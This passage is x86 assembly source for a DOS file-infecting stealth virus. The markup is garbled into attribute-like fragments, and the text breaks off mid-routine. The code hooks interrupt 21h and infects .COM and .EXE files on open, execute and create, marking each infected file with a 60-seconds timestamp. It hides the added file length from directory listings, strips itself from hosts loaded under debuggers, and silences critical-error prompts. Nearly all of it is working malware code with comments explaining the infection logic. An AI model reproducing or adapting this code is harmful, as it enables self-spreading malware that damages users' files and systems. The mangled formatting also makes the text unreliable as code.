dw="" offset="" hide_length-offset="" begin="" db="" 12h="" ;find="" next="" (fcb)="" dw="" offset="" hide_length-offset="" begin="" db="" 3ch="" ;create="" file="" dw="" offset="" do_create-offset="" begin="" db="" 3dh="" ;open="" file="" dw="" offset="" do_infect-offset="" begin="" db="" 3eh="" ;close="" file="" dw="" offset="" do_close-offset="" begin="" db="" 3fh="" ;read="" file="" dw="" offset="" do_disinf-offset="" begin="" db="" 40h="" ;write="" file="" dw="" offset="" do_disinf-offset="" begin="" db="" 42h="" ;set="" file="" pointer="" dw="" offset="" check_disinf-offset="" begin="" db="" 4bh="" ;load="" file="" dw="" offset="" check_infect-offset="" begin="" db="" 4eh="" ;find="" first="" (dta)="" dw="" offset="" hide_length-offset="" begin="" db="" 4fh="" ;find="" next="" (dta)="" dw="" offset="" hide_length-offset="" begin="" db="" 57h="" ;get/set="" file="" date="" and="" time="" dw="" offset="" fix_time-offset="" begin="" db="" 5bh="" ;create="" file="" dw="" offset="" do_create-offset="" begin="" db="" 6ch="" ;extended="" open/create="" (dos="" v4.00+)="" dw="" offset="" check_extend-offset="" begin="" default_handler:="" db="" 0="" ;this="" must="" not="" be="" removed="" ;corresponds="" to="" anything="" else="" dw="" offset="" jfar_21h-offset="" begin="" ;this="" must="" not="" be="" removed="" ;="" adding="" new="" opcode="" handlers="" is="" very="" simple="" -="" ;="" simply="" insert="" the="" value="" of="" the="" opcode="" to="" intercept="" (ah="" only!),="" ;="" and="" the="" address="" of="" the="" handler,="" above="" the="" default="" handler="" call_21h:="" pushf="" ;save="" flags="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" push="" offset="" known_ret-offset="" begin="" ;save="" offset="" of="" a="" known="" ret="" on="" stack="" ;(simulate="" interrupt="" call)="" jfar_21h:="" db="" 0eah="" ;jmp="" xxxx:xxxx="" dd="" 0="" ;original="" interrupt="" 21h="" address="" here="" hide_length:="" push="" ax="" ;save="" requested="" operation="" on="" stack="" call="" call_21h="" ;find="" file="" pushf="" ;save="" flags="" on="" stack="" push="" bp="" ;save="" bp="" on="" stack="" mov="" bp,sp="" ;point="" to="" current="" top="" of="" stack="" test="" byte="" ptr="" ss:[bp+5],40h="" ;check="" requested="" operation="" jz="" save_code="" ;branch="" if="" fcb="" find="" push="" word="" ptr="" ss:[bp+2]="" ;save="" flags="" on="" stack="" pop="" word="" ptr="" ss:[bp+0ah]="" ;restore="" flags="" from="" stack="" (save="" as="" original)="" save_code:="" mov="" word="" ptr="" ss:[bp+4],ax="" ;save="" return="" code="" on="" stack="" lahf="" ;store="" flags="" in="" ah="" pop="" bp="" ;restore="" bp="" from="" stack="" popf="" ;restore="" flags="" from="" stack="" or="" al,al="" ;check="" return="" code="" jnz="" quit_hide="" ;branch="" if="" error="" occurred="" push="" ds="" ;save="" ds="" on="" stack="" push="" es="" ;save="" es="" on="" stack="" push="" bx="" ;save="" bx="" on="" stack="" sahf="" ;store="" ah="" in="" flags="" pushf="" ;save="" flags="" on="" stack="" call="" get_psp="" ;retrieve="" psp="" segment="" mov="" es,bx="" ;move="" psp="" segment="" into="" es="" cmp="" bx,word="" ptr="" es:[16h]="" ;compare="" current="" psp="" with="" parent="" psp="" jnz="" nohide="" ;branch="" if="" psps="" differ="" ;(this="" prevents="" chkdsk="" errors!)="" mov="" bx,dx="" ;move="" offset="" of="" fcb="" into="" bx="" mov="" ah,2fh="" ;subfunction="" to="" retrieve="" dta="" address="" mov="" al,byte="" ptr="" ds:[bx]="" ;retrieve="" fcb="" type="" call="" call_21h="" ;retrieve="" dta="" address="" inc="" al="" ;check="" fcb="" type="" jnz="" time_adjust="" ;branch="" if="" not="" extended="" fcb="" add="" bx,7="" ;allow="" for="" additional="" bytes="" time_adjust:="" popf="" ;restore="" flags="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" jz="" getime="" ;branch="" if="" fcb="" find="" dec="" bx="" ;adjust="" offset="" for="" dta="" find="" getime:="" push="" es="" ;save="" dta="" segment="" on="" stack="" pop="" ds="" ;restore="" dta="" segment="" from="" stack="" mov="" al,byte="" ptr="" ds:[bx+17h]="" ;retrieve="" file="" time="" from="" fcb="" and="" al,1fh="" ;convert="" time="" to="" seconds="" only="" xor="" al,1eh="" ;check="" for="" 60="" seconds="" jnz="" nohide="" ;branch="" if="" file="" is="" not="" infected="" and="" byte="" ptr="" ds:[bx+17h],0e0h="" ;set="" 0="" seconds="" inc="" byte="" ptr="" ds:[bx+17h]="" ;prevent="" 12:00am="" times="" disappearing="" popf="" ;restore="" flags="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" jz="" adjust_size="" ;branch="" if="" fcb="" find="" dec="" bx="" dec="" bx="" ;adjust="" offset="" for="" dta="" find="" adjust_size:="" sub="" word="" ptr="" ds:[bx+1dh],code_byte_c="" ;hide="" file="" length="" increase="" sbb="" word="" ptr="" ds:[bx+1fh],0="" ;allow="" for="" page="" shift="" nohide:="" popf="" ;restore="" flags="" from="" stack="" pop="" bx="" ;restore="" bx="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" quit_hide:="" pop="" ax="" ;restore="" return="" code="" from="" stack="" iret="" ;return="" from="" interrupt="" check_extend:="" or="" al,al="" ;check="" requested="" operation="" jnz="" jfar_21h="" ;branch="" if="" not="" extended="" open/create="" push="" bx="" ;save="" bx="" on="" stack="" push="" dx="" ;save="" dx="" on="" stack="" mov="" dx,si="" ;move="" offset="" of="" pathname="" into="" dx="" db="" 38h="" ;dummy="" operation="" to="" mask="" push="" and="" push="" do_create:="" push="" bx="" ;save="" bx="" on="" stack="" push="" dx="" ;save="" dx="" on="" stack="" mov="" byte="" ptr="" cs:[offset="" file_handle-offset="" begin],0ffh="" ;specify="" file="" is="" not="" to="" be="" infected="" push="" es="" ;save="" es="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" push="" ds="" ;save="" segment="" of="" pathname="" on="" stack="" pop="" es="" ;restore="" segment="" of="" pathname="" from="" stack="" push="" offset="" create_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" subroutine="" call)="" get_suffix:="" xor="" al,al="" ;set="" sentinel="" byte="" to="" 0="" mov="" cx,7fh="" ;number="" of="" bytes="" to="" search="" mov="" di,dx="" ;move="" offset="" of="" pathname="" into="" di="" repnz="" scasb="" ;find="" sentinel="" byte="" in="" pathname="" lea="" si,word="" ptr="" [di-6]="" ;offset="" of="" suffix-1="" cmp="" dx,si="" ;ensure="" that="" file="" has="" suffix="" ;(prevents="" some="" truly="" peculiar="" bugs!)="" ja="" return_suffix="" ;branch="" if="" file="" has="" no="" suffix="" mov="" cl,2="" ;number="" of="" words="" to="" compare="" inc="" si="" ;point="" at="" period="" in="" filename="" get_type:="" db="" 26h="" ;es:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" lodsw="" ;retrieve="" half="" of="" suffix="" and="" ax,0dfdfh="" ;convert="" to="" uppercase="" xchg="" bx,ax="" ;move="" half="" of="" suffix="" into="" bx="" loop="" get_type="" ;repeat="" for="" other="" half="" of="" suffix="" ;="" default="" suffix="" comparison="" here="" cmp="" ax,430eh="" ;check="" first="" half="" of="" suffix="" jnz="" return_suffix="" ;branch="" if="" not="" 'c.'="" cmp="" bx,4d4fh="" ;check="" if="" second="" half="" is="" 'mo'="" ;="" no="" need="" to="" check="" for="" .exe="" suffixes,="" ;="" since="" .exe="" files="" are="" recognised="" by="" the="" first="" two="" bytes="" of="" the="" header,="" ;="" and="" infected="" regardless="" of="" their="" suffix.="" ;="" alternate="" suffix="" comparison="" here="" ;="" only="" useful="" if="" you="" have="" more="" than="" 2="" suffices!="" ;="" (because="" additional="" size-cost="" is="" only="" 4="" bytes,="" rather="" than="" 11)="" ;="" push="" es="" ;save="" es="" on="" stack="" ;="" push="" cs="" ;save="" cs="" on="" stack="" ;="" pop="" es="" ;restore="" cs="" from="" stack="" ;="" mov="" cl,(offset="" create_cont-offset="" suffix_list)/4="" ;number="" of="" suffices="" to="" compare="" ;="" mov="" di,offset="" suffix_list-offset="" begin="" ;offset="" of="" table="" of="" suffices="" scan_suffix:="" ;="" scasw="" ;compare="" first="" half="" of="" suffix="" ;="" jnz="" skip_suffix="" ;branch="" if="" suffices="" do="" not="" match="" ;="" xchg="" bx,ax="" ;swap="" second="" half="" of="" suffix="" with="" first="" half="" ;="" scasw="" ;compare="" second="" half="" of="" suffix="" ;="" xchg="" bx,ax="" ;swap="" second="" half="" of="" suffix="" with="" first="" half="" ;="" db="" 0beh="" ;dummy="" operation="" to="" mask="" inc="" and="" inc="" skip_suffix:="" ;="" inc="" di="" ;skip="" 1="" byte="" in="" destination="" ;="" inc="" di="" ;skip="" 1="" byte="" in="" destination="" loop_suffix:="" ;="" loopnz="" scan_suffix="" ;branch="" if="" no="" match="" but="" suffices="" remain="" ;="" pop="" es="" ;restore="" es="" from="" stack="" ;="" alternate="" suffix="" comparison="" ends="" return_suffix:="" lahf="" ;store="" result="" in="" ah="" and="" ah,suffix_flag="" ;strip="" off="" all="" but="" result="" flag="" mov="" bx,offset="" toggle_byte-offset="" begin="" ;area="" to="" store="" toggle="" data="" or="" byte="" ptr="" cs:[bx],suffix_flag="" ;store="" suffix="" type="" in="" toggle="" xor="" byte="" ptr="" cs:[bx],ah="" ;update="" suffix="" type="" in="" toggle="" ;(clear="" if="" executable,="" set="" if="" not)="" ret="" ;return="" from="" subroutine="" ;="" alternate="" suffix="" comparison="" list="" here="" suffix_list:="" ;="" db="" 0eh,"com"="" ;="" db="" 0eh,"bin"="" ;="" db="" 0eh,"ovl"="" create_cont:="" mov="" al,byte="" ptr="" cs:[bx]="" ;get="" suffix="" type="" and="" al,suffix_flag="" ;strip="" off="" all="" but="" suffix="" flag="" shr="" al,1="" ;convert="" to="" close="" flag="" or="" byte="" ptr="" cs:[bx],closef_flag="" ;store="" close="" flag="" in="" toggle="" xor="" byte="" ptr="" cs:[bx],al="" ;update="" close="" flag="" in="" toggle="" ;(set="" if="" executable,="" clear="" if="" not)="" popa="" ;restore="" all="" registers="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" pop="" dx="" ;restore="" dx="" from="" stack="" push="" ax="" ;save="" ax="" on="" stack="" call="" call_21h="" ;create="" file="" jb="" extend_ret="" ;branch="" if="" error="" xchg="" bx,ax="" ;move="" handle="" number="" into="" bx="" push="" cx="" ;save="" cx="" on="" stack="" push="" dx="" ;save="" dx="" on="" stack="" push="" offset="" extend_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" subroutine="" call)="" check_seconds:="" mov="" ax,5700h="" ;subfunction="" to="" retrieve="" file="" date="" and="" time="" call="" call_21h="" ;retrieve="" file="" date="" and="" time="" mov="" ax,cx="" ;move="" seconds="" into="" ax="" or="" cl,1fh="" ;set="" entire="" seconds="" field="" dec="" cx="" ;set="" 60="" seconds="" xor="" al,cl="" ;check="" for="" 60="" seconds="" ret="" ;return="" from="" subroutine="" extend_cont:="" pop="" dx="" ;restore="" dx="" from="" stack="" pop="" cx="" ;restore="" cx="" from="" stack="" xchg="" bx,ax="" ;move="" handle="" number="" into="" ax="" jz="" extend_ret="" ;branch="" if="" file="" is="" already="" infected="" mov="" byte="" ptr="" cs:[offset="" file_handle-offset="" begin],al="" ;specify="" file="" is="" to="" be="" infected="" extend_ret:="" pop="" bx="" ;discard="" 2="" bytes="" from="" stack="" jb="" extend_error="" ;branch="" if="" error="" pop="" bx="" ;restore="" bx="" from="" stack="" retf="" 2="" ;return="" from="" interrupt="" with="" flags="" set="" extend_error:="" xchg="" bx,ax="" ;move="" operation="" into="" ax="" pop="" bx="" ;restore="" bx="" from="" stack="" no_infect:="" jmp="" jfar_21h="" ;branch="" to="" original="" interrupt="" 21h="" handler="" debug_jmp:="" jmp="" debug_ret="" ;branch="" to="" return="" from="" operation="" check_infect:="" cmp="" al,2="" ;reserved...="" jz="" no_infect="" cmp="" al,3="" ;load="" overlay...="" ja="" no_infect="" pusha="" ;windows="" mov="" ax,160ah="" ;executing="" int="" 2fh="" ;test.="" or="" ax,ax="" ;(hopefully)="" popa="" ;only="" jz="" no_infect="" ;temporary.="" call="" check_environ="" ;infect="" file="" or="" al,al="" ;check="" requested="" operation="" jnz="" debug_load="" ;branch="" if="" load="" only="" push="" es="" ;save="" es="" on="" stack="" push="" bx="" ;save="" bx="" on="" stack="" push="" ds="" ;save="" ds="" on="" stack="" push="" cx="" ;save="" cx="" on="" stack="" push="" si="" ;save="" si="" on="" stack="" push="" di="" ;save="" di="" on="" stack="" push="" es="" ;save="" parameter="" block="" segment="" on="" stack="" pop="" ds="" ;restore="" parameter="" block="" segment="" from="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" inc="" ax="" ;set="" operation="" to="" load="" only="" mov="" cx,7="" ;parameter="" block="" byte-count="" mov="" si,bx="" ;move="" offset="" of="" parameter="" block="" into="" si="" mov="" bx,offset="" header_buffer-offset="" begin+0ah="" ;area="" to="" store="" parameter="" block="" mov="" di,bx="" ;move="" offset="" of="" area="" into="" di="" repz="" movsw="" ;save="" parameter="" block="" pop="" di="" ;restore="" di="" from="" stack="" pop="" si="" ;restore="" si="" from="" stack="" pop="" cx="" ;restore="" cx="" from="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" push="" offset="" spawn_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" debug_load:="" mov="" byte="" ptr="" cs:[offset="" scratch_area-offset="" begin+8],al="" ;save="" requested="" operation="" push="" bx="" ;save="" bx="" on="" stack="" push="" dx="" ;save="" dx="" on="" stack="" call="" call_21h="" ;load="" file="" pop="" dx="" ;restore="" dx="" from="" stack="" pop="" bx="" ;restore="" dx="" from="" stack="" jb="" debug_jmp="" ;branch="" if="" error="" push="" es="" ;save="" es="" on="" stack="" push="" ds="" ;save="" ds="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" push="" bx="" ;save="" bx="" on="" stack="" mov="" ax,3d00h="" ;subfunction="" to="" open="" file="" call="" call_21h="" ;open="" file="" for="" read="" only="" xchg="" bx,ax="" ;move="" handle="" number="" into="" bx="" call="" check_seconds="" ;check="" if="" file="" already="" infected="" pushf="" ;save="" result="" on="" stack="" call="" read_header="" ;read="" first="" 18h="" bytes="" mov="" ah,3eh="" ;subfunction="" to="" close="" file="" call="" call_21h="" ;close="" file="" mov="" bp,dx="" ;area="" containing="" original="" header="" popf="" ;retrieve="" infection="" result="" from="" stack="" pop="" bx="" ;restore="" bx="" from="" stack="" jnz="" okay_debug="" ;branch="" if="" file="" is="" not="" infected="" mov="" ds,word="" ptr="" es:[bx]="" ;get="" destination="" segment="" xor="" di,di="" ;set="" destination="" offset="" to="" 0="" cmp="" byte="" ptr="" cs:[bp+offset="" scratch_area-offset="" header_buffer+8],3="" ;check="" requested="" operation="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" pushf="" ;save="" result="" on="" stack="" jz="" test_debug="" ;branch="" if="" load="" overlay="" lds="" di,dword="" ptr="" es:[bx+12h]="" ;retrieve="" address="" of="" child="" process="" test_debug:="" lea="" si,word="" ptr="" [di+offset="" exe_buffer-offset="" begin+3]="" ;offset="" of="" original="" .exe="" code="" cmp="" byte="" ptr="" cs:[bp],0e9h="" ;check="" file="" type="" jnz="" debug_exe="" ;branch="" if="" .exe="" file="" popf="" ;discard="" 2="" bytes="" from="" stack="" add="" si,word="" ptr="" ds:[di+1]="" ;offset="" of="" original="" .com="" code="" push="" ds="" ;save="" initial="" code="" segment="" on="" stack="" pop="" es="" ;restore="" initial="" code="" segment="" from="" stack="" push="" si="" ;save="" viral="" code="" offset="" on="" stack="" movsb="" movsw="" ;restore="" original="" 3="" bytes="" of="" .com="" file="" jmp="" short="" clear_area="" ;branch="" to="" clear="" memory="" of="" code="" debug_exe:="" popf="" ;restore="" requested="" operation="" result="" from="" stack="" jnz="" disinf_exe="" ;branch="" if="" not="" load="" overlay="" mov="" ax,ds="" ;move="" ds="" into="" ax="" add="" ax,word="" ptr="" cs:[bp+16h]="" ;add="" initial="" cs="" mov="" es,ax="" ;move="" destination="" segment="" into="" es="" push="" word="" ptr="" cs:[bp+14h]="" ;save="" initial="" ip="" on="" stack="" jmp="" short="" clear_area="" ;branch="" to="" clear="" memory="" of="" code="" disinf_exe:="" add="" si,0bh="" ;point="" to="" original="" file="" header="" lea="" di,word="" ptr="" [bx+0eh]="" ;offset="" of="" end="" of="" original="" parameter="" block="" call="" get_psp="" ;retrieve="" psp="" segment="" add="" bx,10h="" ;point="" to="" first="" allocated="" segment="" lodsw="" ;retrieve="" stack="" segment="" add="" ax,bx="" ;relocate="" for="" actual="" memory="" segment="" push="" ax="" ;save="" stack="" segment="" on="" stack="" movsw="" ;store="" stack="" pointer="" in="" parameter="" block="" pop="" ax="" ;restore="" stack="" segment="" from="" stack="" stosw="" ;save="" stack="" segment="" in="" parameter="" block="" lodsw="" ;skip="" checksum="" (waste="" of="" 2="" bytes!)="" push="" word="" ptr="" es:[di]="" ;save="" instruction="" pointer="" on="" stack="" movsw="" ;store="" instruction="" pointer="" in="" parameter="" block="" lodsw="" ;retrieve="" code="" segment="" add="" ax,bx="" ;relocate="" for="" actual="" memory="" segment="" stosw="" ;store="" code="" segment="" in="" parameter="" block="" push="" ds="" ;save="" initial="" code="" segment="" on="" stack="" pop="" es="" ;restore="" initial="" code="" segment="" from="" stack="" clear_area:="" xor="" ax,ax="" ;set="" store="" byte="" to="" 0="" mov="" cx,code_word_c="" ;number="" of="" words="" to="" clear="" pop="" di="" ;restore="" viral="" code="" offset="" from="" stack="" repz="" stosw="" ;clear="" viral="" code="" from="" host="" file="" in="" memory="" okay_debug:="" cmp="" byte="" ptr="" cs:[bp+offset="" scratch_area-offset="" header_buffer+8],3="" ;check="" requested="" operation="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" popa="" ;restore="" all="" registers="" from="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" jz="" skip_psp="" ;branch="" if="" load="" overlay="" push="" ds="" ;save="" ds="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" call="" test_int12h="" ;check="" if="" interrupt="" 12h="" already="" hooked="" popa="" ;restore="" all="" registers="" from="" stack="" mov="" dx,ds="" ;move="" ds="" into="" dx="" pop="" ds="" ;restore="" ds="" from="" stack="" skip_psp:="" pop="" es="" ;restore="" es="" from="" stack="" debug_ret:="" retf="" 2="" ;return="" from="" interrupt="" with="" flags="" set="" spawn_cont:="" pop="" bx="" ;restore="" bx="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" jb="" debug_ret="" ;branch="" if="" error="" mov="" bp,sp="" ;point="" to="" current="" top="" of="" stack="" lds="" si,dword="" ptr="" ss:[bp+6]="" ;retrieve="" termination="" address="" mov="" es,dx="" ;move="" dx="" into="" es="" set_terminate:="" mov="" ax,offset="" terminate-offset="" begin="" ;offset="" of="" new="" termination="" handler="" mov="" di,0ah="" ;offset="" of="" termination="" address="" in="" psp="" stosw="" ;store="" new="" termination="" handler="" offset="" mov="" ax,cs="" ;segment="" of="" new="" termination="" handler="" stosw="" ;store="" new="" termination="" handler="" segment="" mov="" di,offset="" process_no-offset="" begin="" ;area="" containing="" process="" information="" add="" word="" ptr="" cs:[di],4="" ;specify="" new="" process="" is="" spawning="" add="" di,word="" ptr="" cs:[di]="" ;retrieve="" process="" number="" mov="" word="" ptr="" cs:[di+offset="" process_off-offset="" process_no-4],si="" ;save="" old="" offset="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" word="" ptr="" cs:[di+offset="" process_seg-offset="" process_no-4],ds="" ;save="" old="" code="" segment="" org="" $-2="" ;hard-coded="" fixup="" for="" previous="" operation="" push="" es="" ;save="" ds="" on="" stack="" pop="" ds="" ;restore="" es="" from="" stack="" mov="" ax,4b00h="" ;set="" operation="" to="" execute="" iret="" ;return="" from="" interrupt="" do_infect:="" push="" offset="" jfar_21h-offset="" begin="" ;save="" return="" address="" on="" stack="" ;(simulate="" subroutine="" call)="" ;infecting="" on="" close="" instead="" of="" open="" requires="" more="" code="" to="" set="" read/write="" mode!="" check_environ:="" push="" ds="" ;save="" ds="" on="" stack="" push="" es="" ;save="" es="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" push="" ds="" ;save="" ds="" on="" stack="" pop="" es="" ;restore="" es="" from="" stack="" push="" ax="" ;save="" ax="" on="" stack="" call="" get_suffix="" ;get="" file="" suffix="" pop="" ax="" ;restore="" ax="" from="" stack="" cmp="" ah,4bh="" ;check="" requested="" operation="" jnz="" skip_flag="" ;branch="" if="" not="" load="" and="" byte="" ptr="" cs:[bx],0ffh-suffix_flag="" ;specify="" file="" to="" be="" infected="" ;(any="" file="" that="" is="" executed="" is="" fair="" game!)="" skip_flag:="" push="" offset="" attrib_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" subroutine="" call)="" hook_24h:="" mov="" ax,offset="" new_24h-offset="" begin="" ;offset="" of="" new="" interrupt="" 24h="" handler="" db="" 38h="" ;dummy="" operation="" to="" mask="" move="" restore_24h:="" mov="" ax,4d47h="" ;offset="" of="" original="" interrupt="" 24h="" handler="" ;(the="" value="" here="" is="" altered="" as="" required)="" push="" 0="" ;save="" 0="" on="" stack="" pop="" ds="" ;set="" ds="" to="" 0="" mov="" si,90h="" ;offset="" of="" interrupt="" 24h="" in="" interrupt="" table="" xchg="" ax,word="" ptr="" ds:[si]="" ;exchange="" old="" offset="" with="" new="" offset="" mov="" word="" ptr="" cs:[offset="" restore_24h-offset="" begin+1],ax="" ;save="" old="" interrupt="" 24h="" offset="" lodsw="" ;skip="" 2="" bytes="" in="" source="" mov="" ax,word="" ptr="" ds:[si]="" ;retrieve="" old="" interrupt="" 24h="" segment="" xchg="" ax,word="" ptr="" cs:[offset="" old21h_code-offset="" begin+3]="" ;exchange="" old="" segment="" with="" new="" segment="" mov="" word="" ptr="" ds:[si],ax="" ;save="" old="" interrupt="" 24h="" segment="" ret="" ;return="" from="" subroutine="" attrib_cont:="" push="" es="" ;save="" es="" on="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" mov="" ax,3d00h="" ;subfunction="" to="" open="" file="" call="" call_21h="" ;open="" file="" jb="" bad_op="" ;branch="" if="" error="" xchg="" bx,ax="" ;move="" handle="" number="" into="" bx="" call="" check_seconds="" ;check="" if="" file="" already="" infected="" jz="" bad_rd="" ;branch="" if="" file="" is="" already="" infected="" push="" cx="" ;save="" file="" time="" on="" stack="" push="" dx="" ;save="" file="" date="" on="" stack="" call="" infect="" ;infect="" file="" pop="" dx="" ;restore="" file="" date="" from="" stack="" pop="" cx="" ;restore="" file="" time="" from="" stack="" jb="" bad_rd="" ;branch="" if="" error="" mov="" ax,5701h="" ;subfunction="" to="" set="" file="" date="" and="" time="" call="" call_21h="" ;set="" file="" date="" and="" time="" bad_rd:="" mov="" ah,3eh="" ;subfunction="" to="" close="" file="" call="" call_21h="" ;close="" file="" bad_op:="" call="" restore_24h="" ;restore="" interrupt="" 24h="" popa="" ;restore="" all="" registers="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" ret="" ;return="" from="" subroutine="" new_24h:mov="" al,3="" ;abort="" on="" critical="" error="" (for="" interrupt="" 24h)="" iret="" ;return="" from="" interrupt="" infect:="" mov="" ax,1220h="" ;subfunction="" to="" get="" address="" of="" jft="" int="" 2fh="" ;get="" address="" of="" jft="" mov="" ax,1216h="" ;subfunction="" to="" get="" address="" of="" sft="" push="" bx="" ;save="" handle="" number="" on="" stack="" mov="" bl,byte="" ptr="" es:[di]="" ;get="" sft="" number="" int="" 2fh="" ;get="" address="" of="" sft="" pop="" bx="" ;restore="" handle="" number="" from="" stack="" or="" byte="" ptr="" es:[di+2],2="" ;set="" open="" mode="" to="" read/write="" in="" sft="" push="" offset="" infect_cont-offset="" begin="" ;save="" return="" address="" on="" stack="" read_header:="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" mov="" ah,3fh="" ;subfunction="" to="" read="" from="" file="" mov="" cx,18h="" ;number="" of="" bytes="" in="" header="" mov="" dx,offset="" header_buffer-offset="" begin="" ;offset="" of="" original="" header="" jmp="" call_21h="" ;read="" .exe="" header="" infect_cont:="" xor="" ax,cx="" ;ensure="" all="" bytes="" read="" jnz="" sml_file="" ;branch="" if="" error="" or="" file="" smaller="" than="" 18h="" bytes="" ;(no="" int="" 20h="" files="" -="" that'll="" help="" prevent="" isolation!)="" push="" ds="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" mov="" si,dx="" ;move="" offset="" of="" original="" buffer="" into="" si="" mov="" di,offset="" exe_buffer-offset="" begin="" ;offset="" of="" area="" to="" store="" original="" header="" repz="" movsb="" ;save="" header="" mov="" di,dx="" ;move="" offset="" of="" original="" buffer="" into="" di="" mov="" ax,4d5ah="" ;set="" initial="" header="" id="" to="" 'zm'="" cmp="" ax,word="" ptr="" ds:[di]="" ;check="" contents="" of="" header="" xchg="" ah,al="" ;switch="" to="" 'mz'="" jz="" save_type="" ;branch="" if="" header="" contains="" 'zm'="" cmp="" ax,word="" ptr="" ds:[di]="" ;check="" if="" header="" contains="" 'mz'="" save_type:="" pushf="" ;save="" file="" type="" result="" on="" stack="" jnz="" check_suffix="" ;branch="" if="" not="" .exe="" file="" mov="" word="" ptr="" ds:[di],ax="" ;save="" 'mz'="" in="" header="" jmp="" short="" find_eof="" ;branch="" to="" get="" length="" of="" file="" check_suffix:="" test="" byte="" ptr="" ds:[di+offset="" toggle_byte-offset="" header_buffer],suffix_flag="" ;check="" suffix="" flag="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" jnz="" not_exe="" ;branch="" if="" not="" executable="" suffix="" find_eof:="" cwd="" ;set="" low="" file="" pointer="" position="" to="" 0="" call="" set_efp="" ;retrieve="" file="" size="" mov="" word="" ptr="" ds:[di+offset="" scratch_area-offset="" header_buffer],ax="" ;save="" low="" file="" size="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" word="" ptr="" ds:[di+offset="" scratch_area-offset="" header_buffer+2],dx="" ;save="" high="" file="" size="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" popf="" ;restore="" file="" type="" result="" from="" stack="" pushf="" ;save="" file="" type="" result="" on="" stack="" jz="" overlay_check="" ;branch="" if="" .exe="" file="" cmp="" ax,com_byte_c+1="" ;check="" size="" of="" file="" +="" virus="" jnb="" not_exe="" ;branch="" if="" maximum="" file="" size="" exceeded="" mov="" byte="" ptr="" ds:[di],0e9h="" ;save="" initial="" jump="" in="" file="" sub="" ax,3="" ;calculate="" offset="" of="" viral="" code="" in="" file="" mov="" word="" ptr="" ds:[di+1],ax="" ;store="" offset="" of="" jump="" to="" viral="" code="" in="" file="" jmp="" short="" ok_com="" ;branch="" to="" write="" viral="" code="" not_exe:popf="" ;discard="" 2="" bytes="" from="" stack="" sml_file:="" stc="" ;specify="" error="" occurred="" ret="" ;return="" from="" subroutine="" overlay_check:="" cmp="" word="" ptr="" ds:[di+0ch],0ffffh="" ;check="" value="" of="" maxalloc="" jnz="" not_exe="" ;branch="" if="" not="" allocate="" all="" memory="" ;(i="" cannot="" justify="" the="" code="" size="" increase="" to="" support="" this)="" mov="" ch,2="" ;set="" divisor="" to="" 200h="" div="" cx="" ;calculate="" number="" of="" 512-byte="" pages="" or="" dx,dx="" ;check="" last="" page="" size="" jz="" skip_page="" ;branch="" if="" 512-byte="" aligned="" inc="" ax="" ;add="" last="" page="" to="" count="" skip_page:="" cmp="" ax,word="" ptr="" ds:[di+4]="" ;check="" high="" file="" size="" jnz="" not_exe="" ;branch="" if="" file="" contains="" overlay="" data="" cmp="" dx,word="" ptr="" ds:[di+2]="" ;check="" low="" file="" size="" jnz="" not_exe="" ;branch="" if="" file="" contains="" overlay="" data="" cwd="" ;zero="" dx="" mov="" ax,word="" ptr="" ds:[di+offset="" scratch_area-offset="" header_buffer]="" ;retrieve="" low="" file="" size="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" add="" ax,code_byte_c="" ;add="" code="" byte="" count="" adc="" dx,word="" ptr="" ds:[di+offset="" scratch_area-offset="" header_buffer+2]="" ;calculate="" new="" file="" size="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" div="" cx="" ;calculate="" number="" of="" 512-byte="" pages="" or="" dx,dx="" ;check="" last="" page="" size="" jz="" save_size="" ;branch="" if="" 512-byte="" page="" aligned="" inc="" ax="" ;add="" last="" page="" to="" count="" save_size:="" mov="" word="" ptr="" ds:[di+2],dx="" ;store="" number="" of="" bytes="" in="" last="" page="" mov="" word="" ptr="" ds:[di+4],ax="" ;store="" number="" of="" pages="" cwd="" ;set="" write="" offset="" to="" 0="" ok_com:="" mov="" cx,code_byte_c="" ;number="" of="" bytes="" in="" viral="" code="" call="" write_file="" ;write="" viral="" code="" xor="" cx,ax="" ;ensure="" all="" bytes="" were="" written="" jnz="" not_exe="" ;branch="" if="" error="" push="" offset="" write_cont-offset="" begin="" ;save="" return="" address="" on="" stack="" set_zfp:xor="" cx,cx="" ;set="" high="" file="" pointer="" position="" to="" 0="" mov="" dx,cx="" ;set="" low="" file="" pointer="" position="" to="" 0="" set_fp:="" mov="" ax,4200h="" ;subfunction="" to="" set="" file="" pointer="" db="" 38h="" ;dummy="" operation="" to="" mask="" move="" set_efp:mov="" ax,4202h="" ;subfunction="" to="" set="" file="" pointer="" 